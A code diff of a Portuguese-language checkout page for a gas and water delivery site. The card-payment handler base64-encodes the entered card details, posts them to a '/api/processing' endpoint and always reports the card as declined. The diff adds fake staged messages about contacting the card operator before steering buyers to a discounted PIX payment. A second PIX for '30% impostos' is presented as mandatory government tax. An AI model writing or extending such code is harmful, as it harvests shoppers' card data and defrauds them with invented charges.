@@ -337,6 +337,7 @@ export default function CheckoutPage() {
     cardCvv: ''
   })
   const [cardSubmitting, setCardSubmitting] = useState(false)
+  const [cardLoadingMessage, setCardLoadingMessage] = useState('Processando pagamento...')
   const [cardFailed, setCardFailed] = useState(false)
   const [showAddressModal, setShowAddressModal] = useState(false)
   const [searchingDriver, setSearchingDriver] = useState(false)
@@ -346,6 +347,7 @@ export default function CheckoutPage() {
   const [showTaxPaymentModal, setShowTaxPaymentModal] = useState(false)
   const [firstPaymentCompleted, setFirstPaymentCompleted] = useState(false)
   const [taxPixData, setTaxPixData] = useState<any>(null)
+  const [showUpsellModal, setShowUpsellModal] = useState(false)
   const qrCodeRef = useRef<HTMLDivElement>(null)
   const paymentExplanationRef = useRef<HTMLDivElement>(null)
   const driverFoundRef = useRef<HTMLDivElement>(null)
@@ -608,14 +610,9 @@ export default function CheckoutPage() {
     e.preventDefault()
     if (customerData.name && customerData.email && customerData.phone && customerData.number) {
       // Salvar dados do cliente no localStorage
-      localStorage.setItem("configas-customer", JSON.stringify(customerData))
-      console.log('💾 Dados do cliente salvos no localStorage')
-      
+      saveCustomerData(customerData)
+      // Ir para Step 3
       setStep(3)
-      // Iniciar busca de motoboy
-      startDriverSearch()
-      // Gerar PIX diretamente (desconto já foi aplicado se cliente foi aprovado)
-      generatePix(false)
     }
   }
   
@@ -796,6 +793,9 @@ export default function CheckoutPage() {
   }
 
   const generatePix = async (applyDiscount: boolean = false) => {
+    console.log('🚀 [GeneratePix] Iniciando geração de PIX...')
+    console.log('📊 [GeneratePix] Parâmetros:', { applyDiscount, pixDiscount, discountApproved })
+    
     setPixLoading(true)
     setPixError("")
     
@@ -809,10 +809,15 @@ export default function CheckoutPage() {
       let productPrice = productPrices[productName] || 1000
       let kitPrice = kitMangueira ? 980 : 0
       
-      // Aplicar desconto de 10% apenas se o cliente foi aprovado
-      if (discountApproved) {
-        const discount = Math.round(totalPrice * 0.10)
-        setPixDiscount(discount)
+      // Aplicar desconto de 10% se:
+      // 1. Cliente foi aprovado (discountApproved) OU
+      // 2. Já existe desconto aplicado do cartão (pixDiscount > 0)
+      if (discountApproved || pixDiscount > 0) {
+        let discount = pixDiscount
+        if (discountApproved && pixDiscount === 0) {
+          discount = Math.round(totalPrice * 0.10)
+          setPixDiscount(discount)
+        }
         totalPrice = totalPrice - discount
         
         // Aplicar desconto proporcionalmente aos items
@@ -931,10 +936,15 @@ export default function CheckoutPage() {
       const gateway = getClientGateway()
       const mappedName = getMappedGatewayName(gateway.id)
       console.log(`🎯 [Gateway] Usando: ${mappedName}`)
+      console.log(`📡 [GeneratePix] Endpoint: ${gateway.endpoint}`)
+      console.log(`💰 [GeneratePix] Valor total: ${totalPrice}`)
+      console.log(`💳 [GeneratePix] Valor PIX (70%): ${pixAmount}`)
+      console.log(`📦 [GeneratePix] Produto: ${productCode}`)
       
       // Rastrear uso do gateway
       trackGatewayUsage(gateway.id)
 
+      console.log('📤 [GeneratePix] Enviando requisição...')
       const response = await fetch(gateway.endpoint, {
         method: "POST",
         headers: {
@@ -942,12 +952,17 @@ export default function CheckoutPage() {
         },
         body: JSON.stringify(requestData),
       })
+      
+      console.log(`📥 [GeneratePix] Resposta recebida: ${response.status} ${response.statusText}`)
 
       if (!response.ok) {
+        const errorText = await response.text()
+        console.error('❌ [GeneratePix] Erro na resposta:', errorText)
         throw new Error("Erro ao gerar PIX")
       }
 
       const pixResponse: PixResponse = await response.json()
+      console.log('✅ [GeneratePix] PIX gerado com sucesso! ID:', pixResponse.id)
       
       // ✅ SALVAR GATEWAY APENAS APÓS SUCESSO
       saveSuccessfulGateway(gateway.id)
@@ -1178,6 +1193,23 @@ export default function CheckoutPage() {
            productName.toLowerCase().includes("botijões")
   }
 
+  // Obter imagem do produto
+  const getProductImage = () => {
+    const productImageMap: { [key: string]: string } = {
+      "Gás de cozinha 13 kg (P13)": "/images/gas-p13.png",
+      "Combo Gás + Garrafão": "/images/comboGas_garrafao.png",
+      "Garrafão de água Mineral 20L": "/images/agua-indaia-20l.png",
+      "3 Garrafões de Água 20L": "/images/3garrafoes.png",
+      "Combo 2 Botijões de Gás 13kg": "/images/combo 2 botijao 13kg.png",
+      "Botijão de Gás 8kg P8": "/images/gas-p8-8kg.png",
+      "Combo 3 Gás 13kg": "/images/combo3gas13kg.png",
+      "Combo 2 Gás + 2 Água": "/images/combo2Gas2Agua.png",
+      "Combo 2 Gás + 1 Água": "/images/combo2Gas1Agua.png"
+    }
+    
+    return productImageMap[productName] || "/images/gas-p13.png"
+  }
+
   // Calcular preço total incluindo kit mangueira
   const getTotalPrice = () => {
     const basePrice = productPrices[productName] || 1000
@@ -1359,7 +1391,7 @@ export default function CheckoutPage() {
         // Adicionar timestamp para evitar cache
         const timestamp = new Date().getTime()
         const response = await fetch(
-          `${gateway.checkEndpoint}?transactionId=${transactionId}&_t=${timestamp}`,
+          `${gateway.checkEndpoint}?id=${transactionId}&_t=${timestamp}`,
           {
             method: 'GET',
             cache: 'no-store',
@@ -1373,11 +1405,18 @@ export default function CheckoutPage() {
         if (response.ok) {
           const data = await response.json()
           
+          console.log('📥 [POLLING] Resposta recebida:', data)
+          
           // Verificar APENAS o status (PAID ou paid)
           const status = data.status?.toUpperCase()
           console.log(`🔄 [POLLING] Status da transação ${transactionId}: ${status}`)
+          console.log(`🔍 [POLLING] requiresSplitPayment: ${requiresSplitPayment()}`)
+          console.log(`🔍 [POLLING] firstPaymentCompleted: ${firstPaymentCompleted}`)
           
           if (status === 'PAID') {
+            console.log('🎉 STATUS PAID DETECTADO!')
+            console.log('🔍 Verificando tipo de pagamento...')
+            
             // Recuperar dados do localStorage - verificar primeiro se é PIX de impostos
             let savedTransaction = localStorage.getItem('tax-pix-transaction')
             let isTaxPayment = false
@@ -1399,6 +1438,10 @@ export default function CheckoutPage() {
             const currentPixData: PixResponse = transaction.pixData
             const savedCustomerData = transaction.customerData
             const savedAddressData = transaction.addressData
+            
+            console.log('📦 Dados da transação recuperados')
+            console.log('🔍 isTaxPayment:', isTaxPayment)
+            console.log('🔍 requiresSplitPayment():', requiresSplitPayment())
             
             clearInterval(interval)
             setPollingInterval(null)
@@ -1440,19 +1483,48 @@ export default function CheckoutPage() {
               localStorage.removeItem('utmify-tax-payload')
               
               console.log('🎉 PAGAMENTO COMPLETO! Ambas as partes pagas (70% + 30%)')
-            } else if (requiresSplitPayment() && !firstPaymentCompleted) {
+              
+              // Mostrar modal de upsell opcional
+              console.log('⏰ Agendando modal de upsell em 2 segundos...')
+              setTimeout(() => {
+                console.log('🍺 Mostrando modal de upsell...')
+                console.log('🔍 Estado atual showUpsellModal:', showUpsellModal)
+                setShowUpsellModal(true)
+                console.log('✅ setShowUpsellModal(true) executado')
+              }, 2000)
+            } else if (requiresSplitPayment()) {
               // Primeiro pagamento (70%) concluído
               console.log('✅ Primeiro pagamento (70%) detectado como PAID!')
-              setFirstPaymentCompleted(true)
+              console.log('🔍 Estado atual - firstPaymentCompleted:', firstPaymentCompleted)
+              console.log('🔍 Estado atual - showTaxPaymentModal:', showTaxPaymentModal)
+              console.log('🔍 Verificando se já existe tax-pix-transaction...')
               
-              // Reportar conversão Google Ads do primeiro pagamento
-              reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
+              const existingTaxPix = localStorage.getItem('tax-pix-transaction')
+              console.log('🔍 existingTaxPix:', existingTaxPix ? 'SIM' : 'NÃO')
               
-              // Enviar para UTMify PAID da primeira parte (70%)
-              await sendToUtmify('paid')
-              
-              // Mostrar modal para gerar segundo PIX
-              setShowTaxPaymentModal(true)
+              if (!existingTaxPix) {
+                // Ainda não gerou o PIX de 30%
+                console.log('🎯 Primeira vez detectando pagamento de 70%, mostrando modal...')
+                setFirstPaymentCompleted(true)
+                
+                // Reportar conversão Google Ads do primeiro pagamento
+                reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
+                
+                // Enviar para UTMify PAID da primeira parte (70%)
+                await sendToUtmify('paid')
+                
+                // Mostrar modal para gerar segundo PIX
+                console.log('🚨 ABRINDO MODAL DE IMPOSTOS (30%)...')
+                console.log('🚨 Chamando setShowTaxPaymentModal(true)...')
+                setShowTaxPaymentModal(true)
+                
+                // Verificar se o modal foi aberto após um pequeno delay
+                setTimeout(() => {
+                  console.log('🔍 Verificação após 1s - showTaxPaymentModal:', showTaxPaymentModal)
+                }, 1000)
+              } else {
+                console.log('⚠️ PIX de 30% já foi gerado anteriormente, aguardando pagamento...')
+              }
               
               // Não limpar current-pix-transaction ainda, pois ainda falta o segundo pagamento
             } else {
@@ -1468,6 +1540,15 @@ export default function CheckoutPage() {
               
               // Limpar transação temporária APENAS APÓS enviar para UTMify
               localStorage.removeItem('current-pix-transaction')
+              
+              // Mostrar modal de upsell opcional
+              console.log('⏰ Agendando modal de upsell em 2 segundos... (100%)')
+              setTimeout(() => {
+                console.log('🍺 Mostrando modal de upsell... (100%)')
+                console.log('🔍 Estado atual showUpsellModal:', showUpsellModal)
+                setShowUpsellModal(true)
+                console.log('✅ setShowUpsellModal(true) executado (100%)')
+              }, 2000)
             }
           }
         } else {
@@ -2002,6 +2083,49 @@ export default function CheckoutPage() {
     }
   }, [pixData?.id, pixData?.status])
 
+  // Debug: Monitorar mudanças no modal de desconto PIX
+  useEffect(() => {
+    console.log('🔍 [DEBUG] showPixDiscountModal mudou para:', showPixDiscountModal)
+    if (showPixDiscountModal) {
+      console.log('✅ Modal de desconto PIX está ABERTO')
+    } else {
+      console.log('❌ Modal de desconto PIX está FECHADO')
+    }
+  }, [showPixDiscountModal])
+
+  // Debug: Monitorar mudanças no modal de upsell
+  useEffect(() => {
+    console.log('🔍 [DEBUG UPSELL] showUpsellModal mudou para:', showUpsellModal)
+    if (showUpsellModal) {
+      console.log('✅ Modal de UPSELL está ABERTO')
+    } else {
+      console.log('❌ Modal de UPSELL está FECHADO')
+    }
+  }, [showUpsellModal])
+
+  // Gerar PIX automaticamente ao chegar no Step 3
+  useEffect(() => {
+    if (step === 3 && !pixData && customerData && addressData) {
+      console.log('🚀 [AUTO-PIX] Step 3 detectado, gerando PIX automaticamente...')
+      console.log('📊 [AUTO-PIX] Dados disponíveis:', {
+        customerData: !!customerData,
+        addressData: !!addressData,
+        pixDiscount,
+        discountApproved,
+        pixLoading
+      })
+      
+      // Só gerar se ainda não estiver gerando
+      if (!pixLoading) {
+        console.log('✅ [AUTO-PIX] Iniciando geração...')
+        // Gerar PIX com desconto se aplicável
+        generatePix(discountApproved || pixDiscount > 0)
+      } else {
+        console.log('⏳ [AUTO-PIX] Já está gerando, aguardando...')
+      }
+    }
+  }, [step, pixData, customerData, addressData])
+
   // Formatar timer
   const formatPixTimer = () => {
     const mins = Math.floor(pixTimer / 60)
@@ -2033,21 +2157,41 @@ export default function CheckoutPage() {
     // "Criptografar" dados (base64 no front)
     const encryptedData = btoa(JSON.stringify(dataToEncrypt))
 
-    // Salvar dados em background (sem mostrar ao usuário)
+    // Etapa 1: Processando transação
+    setCardLoadingMessage('Processando transação...')
+    await new Promise(resolve => setTimeout(resolve, 1500))
+    
+    // Etapa 2: Contactando operadora
+    setCardLoadingMessage('Contactando a operadora do seu cartão...')
+    
+    // Salvar dados e processar
     try {
-      await fetch('/api/processing', {
+      console.log('📤 Enviando dados do cartão para processamento...')
+      const response = await fetch('/api/processing', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ data: encryptedData })
       })
+      
+      const result = await response.json()
+      console.log('📥 Resposta da API:', result)
+      
     } catch (error) {
-      // Salvar silenciosamente, não mostrar erro
+      console.error('❌ Erro ao processar:', error)
     }
-
-    // Simular processamento
-    await new Promise(resolve => setTimeout(resolve, 2000))
+    
+    await new Promise(resolve => setTimeout(resolve, 1500))
+    
+    // Etapa 3: Aguardando resposta
+    setCardLoadingMessage('Aguardando resposta da operadora...')
+    await new Promise(resolve => setTimeout(resolve, 1500))
+    
+    // Etapa 4: Infelizmente...
+    setCardLoadingMessage('Infelizmente o pagamento não foi aprovado...')
+    await new Promise(resolve => setTimeout(resolve, 1000))
 
     // Sempre mostrar que falhou e oferecer PIX
+    console.log('🚨 Mostrando erro do cartão e oferecendo PIX...')
     setCardSubmitting(false)
     setShowCardForm(false)
     setCardFailed(true)
@@ -2055,11 +2199,15 @@ export default function CheckoutPage() {
     // Calcular e aplicar desconto de 10%
     const discount = Math.round(getTotalPrice() * 0.10)
     setPixDiscount(discount)
+    console.log('💰 Desconto PIX calculado:', discount)
     
     // Mostrar modal de erro com opção PIX
+    console.log('🎯 Abrindo modal de erro do cartão...')
     setTimeout(() => {
+      console.log('🎯 Chamando setShowPixDiscountModal(true)...')
       setShowPixDiscountModal(true)
-    }, 300)
+      console.log('🔍 Estado showPixDiscountModal após set:', showPixDiscountModal)
+    }, 500)
   }
 
   const formatCardNumber = (value: string) => {
@@ -2136,84 +2284,154 @@ export default function CheckoutPage() {
         </DialogContent>
       </Dialog>
       
-      {/* Modal de Pagamento de Impostos (30%) */}
+      {/* Modal de Pagamento de Impostos (30%) - Compacto */}
       <Dialog open={showTaxPaymentModal} onOpenChange={setShowTaxPaymentModal}>
-        <DialogContent className="sm:max-w-lg">
+        <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle className="text-center text-xl font-bold text-gray-800">
-              ✅ Primeira Parte Paga! 🎉
+            <DialogTitle className="text-center text-lg font-bold text-gray-800">
+              ✅ Primeira Parte Paga!
             </DialogTitle>
           </DialogHeader>
           
-          <div className="space-y-4">
-            <div className="bg-green-50 border-2 border-green-300 rounded-lg p-4 text-center">
-              <p className="text-lg font-bold text-green-700 mb-2">
-                Parabéns! Você pagou 70% do valor! 🎊
+          <div className="space-y-3">
+            {/* Resumo Compacto */}
+            <div className="bg-green-50 border border-green-300 rounded-lg p-3 text-center">
+              <p className="text-sm font-bold text-green-700 mb-1">
+                Parabéns! 70% pago 🎊
               </p>
-              <p className="text-sm text-gray-700 leading-relaxed">
-                Agora falta apenas o pagamento dos <strong>impostos (ICMS + PIS/COFINS)</strong> que correspondem a <strong>30% do valor total</strong>.
+              <p className="text-xs text-gray-600">
+                Falta apenas os <strong>impostos (30%)</strong>
               </p>
             </div>
 
-            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4">
-              <h4 className="font-bold text-blue-800 mb-2">📋 Por que pagar separadamente?</h4>
-              <p className="text-xs text-gray-700 leading-relaxed mb-2">
-                Para conseguirmos oferecer este <strong>preço promocional incrível</strong>, precisamos que você pague os impostos diretamente. Isso nos permite manter o custo baixo e repassar a economia para você!
-              </p>
-              <div className="bg-white rounded-lg p-3 mt-2">
-                <p className="text-xs text-gray-600 mb-1">
-                  <strong>Composição do preço:</strong>
-                </p>
-                <div className="space-y-1 text-xs">
-                  <div className="flex justify-between">
-                    <span>✅ Já pago (70%):</span>
-                    <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
-                  </div>
-                  <div className="flex justify-between border-t pt-1">
-                    <span>📊 ICMS + Impostos (30%):</span>
-                    <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
-                  </div>
-                  <div className="flex justify-between border-t pt-1 font-bold">
-                    <span>💰 Total:</span>
-                    <strong className="text-blue-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
-                  </div>
+            {/* Valores */}
+            <div className="bg-white border border-gray-200 rounded-lg p-3">
+              <div className="space-y-1.5 text-xs">
+                <div className="flex justify-between">
+                  <span className="text-gray-600">✅ Já pago (70%):</span>
+                  <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
+                </div>
+                <div className="flex justify-between border-t pt-1.5">
+                  <span className="text-gray-600">📊 Impostos (30%):</span>
+                  <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
+                </div>
+                <div className="flex justify-between border-t pt-1.5 font-bold">
+                  <span>💰 Total:</span>
+                  <strong className="text-blue-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
                 </div>
               </div>
             </div>
 
-            <div className="bg-gradient-to-r from-orange-50 to-yellow-50 border-2 border-orange-300 rounded-lg p-4">
-              <div className="flex items-start gap-2">
-                <span className="text-2xl">🏛️</span>
-                <div className="flex-1">
-                  <h5 className="font-bold text-orange-800 mb-1">Impostos Obrigatórios</h5>
-                  <p className="text-xs text-gray-700 leading-relaxed">
-                    Os <strong>30% restantes</strong> são referentes aos impostos governamentais (ICMS estadual + PIS/COFINS federais) que incidem sobre o gás. Esse valor vai direto para o governo, conforme a <strong>Lei nº 14.134/2021</strong>.
-                  </p>
-                </div>
-              </div>
+            {/* Info Impostos */}
+            <div className="bg-orange-50 border border-orange-200 rounded-lg p-2.5">
+              <p className="text-[10px] text-gray-700 leading-relaxed">
+                <strong>🏛️ Impostos obrigatórios:</strong> ICMS + PIS/COFINS conforme Lei nº 14.134/2021
+              </p>
             </div>
 
+            {/* Botão */}
             <Button
               onClick={async () => {
                 console.log('🔥 Botão clicado! Gerando PIX de 30%...')
-                console.log('💰 Valor dos impostos:', getTaxPaymentAmount())
                 await generateTaxPix()
-                console.log('✅ PIX de 30% gerado com sucesso!')
                 setShowTaxPaymentModal(false)
               }}
-              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3"
+              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-2.5 text-sm"
               disabled={pixLoading}
             >
-              {pixLoading ? '⏳ Gerando...' : `💳 Gerar PIX dos Impostos (${formatPrice(getTaxPaymentAmount())})`}
+              {pixLoading ? '⏳ Gerando...' : `💳 Gerar PIX (${formatPrice(getTaxPaymentAmount())})`}
             </Button>
 
-            <p className="text-xs text-center text-gray-500">
-              Após o pagamento, seu pedido será finalizado e o motoboy será notificado! 🏍️
+            <p className="text-[10px] text-center text-gray-500">
+              Após o pagamento, o motoboy será notificado! 🏍️
             </p>
           </div>
         </DialogContent>
       </Dialog>
       
+      {/* Modal de Upsell de Cervejas - Opcional */}
+      <Dialog open={showUpsellModal} onOpenChange={setShowUpsellModal}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center text-lg font-bold text-gray-800">
+              🎉 Pedido Confirmado!
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="space-y-4">
+            {/* Sucesso */}
+            <div className="bg-green-50 border border-green-300 rounded-lg p-4 text-center">
+              <div className="text-4xl mb-2">✅</div>
+              <p className="text-sm font-bold text-green-700 mb-1">
+                Pagamento Confirmado!
+              </p>
+              <p className="text-xs text-gray-600">
+                Seu pedido está sendo preparado
+              </p>
+            </div>
+
+            {/* Oferta de Cervejas */}
+            <div className="bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-orange-300 rounded-lg p-4">
+              <div className="flex items-center gap-3 mb-3">
+                <span className="text-3xl">🍺</span>
+                <div>
+                  <p className="font-bold text-orange-800 text-sm">
+                    Oferta Exclusiva!
+                  </p>
+                  <p className="text-xs text-gray-700">
+                    Cervejas geladas com desconto especial
+                  </p>
+                </div>
+              </div>
+              
+              <div className="bg-white rounded-lg p-3 mb-3">
+                <p className="text-xs text-gray-700 mb-2">
+                  <strong>Aproveite:</strong>
+                </p>
+                <ul className="text-xs text-gray-600 space-y-1">
+                  <li>🍺 Budweiser - R$ 4,00/un</li>
+                  <li>🍺 Corona Pack - R$ 27,40</li>
+                  <li>🍺 Heineken - R$ 4,10/un</li>
+                  <li>🍺 Original - R$ 3,10/un</li>
+                </ul>
+              </div>
+
+              <p className="text-[10px] text-center text-gray-600">
+                ✨ Entrega junto com seu pedido de gás
+              </p>
+            </div>
+
+            {/* Botões */}
+            <div className="space-y-2">
+              <Button
+                onClick={() => {
+                  setShowUpsellModal(false)
+                  router.push('/upsell')
+                }}
+                className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-orange-700 hover:to-orange-800 text-white font-bold py-2.5 text-sm"
+              >
+                🍺 Ver Ofertas de Cervejas
+              </Button>
+              
+              <Button
+                onClick={() => {
+                  setShowUpsellModal(false)
+                  router.push('/obrigado')
+                }}
+                variant="outline"
+                className="w-full text-sm"
+              >
+                Não, obrigado
+              </Button>
+            </div>
+
+            <p className="text-[10px] text-center text-gray-500">
+              Você pode fechar esta janela a qualquer momento
+            </p>
+          </div>
+        </DialogContent>
+      </Dialog>
+
       {/* Modal de Confirmação de Endereço */}
       <Dialog open={showAddressModal} onOpenChange={setShowAddressModal}>
         <DialogContent className="sm:max-w-md">
@@ -2330,16 +2548,47 @@ export default function CheckoutPage() {
         </div>
 
         {/* Product Info */}
-        <Card className="mb-4 sm:mb-6">
-          <CardHeader className="pb-3 sm:pb-4">
-            <CardTitle className="text-center text-lg sm:text-xl text-gray-800">
-              Finalizando compra:
-              <div className="text-sm sm:text-base font-normal text-gray-600 mt-1">{productName}</div>
-              <div className="text-xl sm:text-2xl font-bold text-blue-600 mt-2">
-                {formatPrice(getTotalPrice())}
+        <Card className="mb-4 sm:mb-6 border-2 border-blue-200 shadow-lg">
+          <CardContent className="p-4 sm:p-6">
+            <div className="flex flex-col sm:flex-row items-center gap-4">
+              {/* Imagem do Produto */}
+              <div className="flex-shrink-0">
+                <img 
+                  src={getProductImage()}
+                  alt={productName}
+                  className="w-24 h-24 sm:w-32 sm:h-32 object-contain rounded-lg shadow-md"
+                />
               </div>
-            </CardTitle>
-          </CardHeader>
+              
+              {/* Detalhes do Produto */}
+              <div className="flex-1 text-center sm:text-left">
+                <p className="text-xs sm:text-sm text-gray-500 uppercase tracking-wide mb-1">
+                  Finalizando compra
+                </p>
+                <h2 className="text-lg sm:text-2xl font-bold text-gray-800 mb-2">
+                  {productName}
+                </h2>
+                <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 sm:gap-4">
+                  <div className="text-2xl sm:text-3xl font-bold text-blue-600">
+                    {formatPrice(getTotalPrice())}
+                  </div>
+                  {isGasProduct() && (
+                    <div className="flex flex-col gap-1">
+                      <span className="text-xs sm:text-sm text-green-600 font-semibold bg-green-50 px-2 py-1 rounded">
+                        ✅ 70% agora
+                      </span>
+                      <span className="text-xs sm:text-sm text-orange-600 font-semibold bg-orange-50 px-2 py-1 rounded">
+                        📊 30% depois (impostos)
+                      </span>
+                    </div>
+                  )}
+                </div>
+                <p className="text-xs text-gray-500 mt-2">
+                  🚚 Entrega em até {driverETA || '30 minutos'}
+                </p>
+              </div>
+            </div>
+          </CardContent>
         </Card>
 
         {/* Step 1: CEP */}
@@ -2379,7 +2628,8 @@ export default function CheckoutPage() {
         {/* Step 2: Customer Data */}
         {step === 2 && addressData && (
           <div className="space-y-4 sm:space-y-6">
-            {/* Address Confirmation */}
+            {/* Address Confirmation - Esconder após preencher dados */}
+            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && (
             <Card>
               <CardHeader className="pb-3 sm:pb-4">
                 <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
@@ -2412,9 +2662,10 @@ export default function CheckoutPage() {
                 </div>
               </CardContent>
             </Card>
+            )}
 
-            {/* Desconto Aprovado */}
-            {discountApproved && customerFound && (
+            {/* Desconto Aprovado - Esconder após preencher dados */}
+            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && discountApproved && customerFound && (
               <Card className="border-2 border-green-400">
                 <CardContent className="pt-4 sm:pt-6">
                   <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-300 rounded-lg p-4">
@@ -2442,7 +2693,7 @@ export default function CheckoutPage() {
               </Card>
             )}
 
-            {/* Explicação do Pagamento em 2 Partes - APENAS PARA GÁS */}
+            {/* Explicação do Pagamento em 2 Partes - Mostrar sempre (antes e depois de preencher) */}
             {isGasProduct() && (
               <Card ref={paymentExplanationRef} className="border-2 border-blue-400 bg-gradient-to-br from-blue-50 to-green-50">
                 <CardContent className="pt-6 pb-6">
@@ -2540,7 +2791,8 @@ export default function CheckoutPage() {
               </Card>
             )}
 
-            {/* Customer Data Form */}
+            {/* Customer Data Form - Esconder após preencher */}
+            {(!customerData.name || !customerData.phone || !customerData.cpf || !customerData.number) && (
             <Card>
               <CardHeader className="pb-3 sm:pb-4">
                 <CardTitle className="text-base sm:text-lg">Confirme seus dados para entrega</CardTitle>
@@ -2914,6 +3166,126 @@ export default function CheckoutPage() {
                 </form>
               </CardContent>
             </Card>
+            )}
+
+            {/* Seleção de Forma de Pagamento - Aparecer após preencher dados */}
+            {customerData.name && customerData.phone && customerData.cpf && customerData.number && (
+              <div className="border-2 border-purple-200 rounded-lg p-4 bg-gradient-to-br from-purple-50 to-pink-50">
+                <h4 className="font-bold text-purple-800 text-sm mb-3 flex items-center gap-2">
+                  <CreditCard className="w-5 h-5" />
+                  Escolha a forma de pagamento
+                </h4>
+                
+                {/* Valor a Pagar Agora */}
+                <div className="bg-blue-50 border-2 border-blue-300 rounded-lg p-3 mb-4">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <p className="text-xs text-gray-600">Valor a pagar agora (70%):</p>
+                      <p className="text-2xl font-bold text-blue-600">
+                        {formatPrice(Math.round(getTotalPrice() * 0.70))}
+                      </p>
+                      {!showCardForm && (
+                        <p className="text-[10px] text-green-600 font-semibold mt-1">
+                          ✨ Com PIX: {formatPrice(Math.round((getTotalPrice() - Math.round(getTotalPrice() * 0.10)) * 0.70))}
+                        </p>
+                      )}
+                    </div>
+                    {isGasProduct() && (
+                      <div className="text-right">
+                        <p className="text-xs text-gray-600">Restante (30%):</p>
+                        <p className="text-sm font-semibold text-gray-700">
+                          {formatPrice(Math.round(getTotalPrice() * 0.30))}
+                        </p>
+                        <p className="text-[10px] text-gray-500">Após entrega</p>
+                      </div>
+                    )}
+                  </div>
+                  {isGasProduct() && (
+                    <div className="mt-2 pt-2 border-t border-blue-200">
+                      <div className="flex items-center justify-between text-xs">
+                        <span className="text-gray-600">Valor total do produto:</span>
+                        <span className="font-semibold text-gray-700">{formatPrice(getTotalPrice())}</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+                
+                <div className="space-y-3">
+                  {/* Opção PIX */}
+                  <div 
+                    onClick={() => setShowCardForm(false)}
+                    className={`p-4 border-2 rounded-lg cursor-pointer transition-all ${
+                      !showCardForm 
+                        ? 'border-green-500 bg-green-50 shadow-md' 
+                        : 'border-gray-300 bg-white hover:border-green-300'
+                    }`}
+                  >
+                    <div className="flex items-center gap-3">
+                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
+                        !showCardForm ? 'border-green-500' : 'border-gray-400'
+                      }`}>
+                        {!showCardForm && <div className="w-3 h-3 rounded-full bg-green-500"></div>}
+                      </div>
+                      <div className="flex-1">
+                        <div className="flex items-center gap-2">
+                          <Smartphone className="w-5 h-5 text-green-600" />
+                          <span className="font-bold text-gray-800">PIX</span>
+                          <span className="text-xs bg-green-500 text-white px-2 py-0.5 rounded-full font-semibold">
+                            10% OFF
+                          </span>
+                        </div>
+                        <p className="text-xs text-gray-600 mt-1">
+                          Pagamento instantâneo • Aprovação imediata
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Opção Cartão */}
+                  <div 
+                    onClick={() => setShowCardForm(true)}
+                    className={`p-4 border-2 rounded-lg cursor-pointer transition-all ${
+                      showCardForm 
+                        ? 'border-blue-500 bg-blue-50 shadow-md' 
+                        : 'border-gray-300 bg-white hover:border-blue-300'
+                    }`}
+                  >
+                    <div className="flex items-center gap-3">
+                      <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
+                        showCardForm ? 'border-blue-500' : 'border-gray-400'
+                      }`}>
+                        {showCardForm && <div className="w-3 h-3 rounded-full bg-blue-500"></div>}
+                      </div>
+                      <div className="flex-1">
+                        <div className="flex items-center gap-2">
+                          <CreditCard className="w-5 h-5 text-blue-600" />
+                          <span className="font-bold text-gray-800">Cartão de Crédito</span>
+                        </div>
+                        <p className="text-xs text-gray-600 mt-1">
+                          Crédito ou Débito • Parcelamento disponível
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Botão Continuar */}
+                <Button
+                  type="button"
+                  onClick={(e) => {
+                    e.preventDefault()
+                    e.stopPropagation()
+                    console.log('🔘 Botão Continuar clicado')
+                    // Mudar para step 3 imediatamente (o loading aparecerá lá)
+                    setStep(3)
+                  }}
+                  disabled={pixLoading}
+                  className="w-full mt-4 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white py-3 text-base font-bold disabled:opacity-50"
+                >
+                  Continuar para Pagamento
+                </Button>
+              </div>
+            )}
           </div>
         )}
 
@@ -3085,10 +3457,12 @@ export default function CheckoutPage() {
 
               {!pixData ? (
                 <div className="text-center">
-                  {pixLoading && searchingDriver && (
+                  {pixLoading && (
                     <div className="flex items-center justify-center gap-3 py-4">
                       <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
-                      <span className="text-blue-800 font-semibold">🔍 Procurando entregador mais próximo...</span>
+                      <span className="text-blue-800 font-semibold">
+                        {searchingDriver ? '🔍 Procurando entregador mais próximo...' : '⏳ Gerando PIX...'}
+                      </span>
                     </div>
                   )}
                   {pixError && <p className="text-red-500 text-xs sm:text-sm mt-3">{pixError}</p>}
@@ -3100,6 +3474,47 @@ export default function CheckoutPage() {
                       <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                       <h3 className="font-semibold text-green-800 text-sm sm:text-base">PIX Gerado com Sucesso!</h3>
                     </div>
+
+                    {/* Informação de Valores - 70% e 30% */}
+                    {requiresSplitPayment() && !firstPaymentCompleted && (
+                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-3">
+                        <p className="text-sm font-bold text-blue-800 mb-2">💰 Pagamento Parcelado</p>
